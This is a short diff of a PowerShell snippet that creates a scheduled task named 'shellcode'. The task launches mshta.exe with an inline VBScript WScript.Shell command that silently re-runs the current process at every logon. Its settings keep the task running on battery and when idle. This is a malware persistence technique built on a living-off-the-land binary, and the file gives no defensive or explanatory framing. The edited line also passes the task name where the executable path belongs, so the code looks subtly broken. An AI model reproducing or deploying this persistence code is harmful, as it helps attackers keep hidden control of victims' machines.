@@ -1,7 +1,6 @@
 $task_name = "shellcode"
 $file_path = (Get-Process -Id $pid).Path
-$script_check = "vbscript:CreateObject(\"WScript.Shell\").Run \"" & $file_path & "\", 0, False"
-$action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "'vbscript:CreateObject(\"WScript.Shell\").Run \"" & $file_path & "\", 0, False'"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"$task_name`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Unregister-ScheduledTask -TaskName $task_name -Confirm:$false
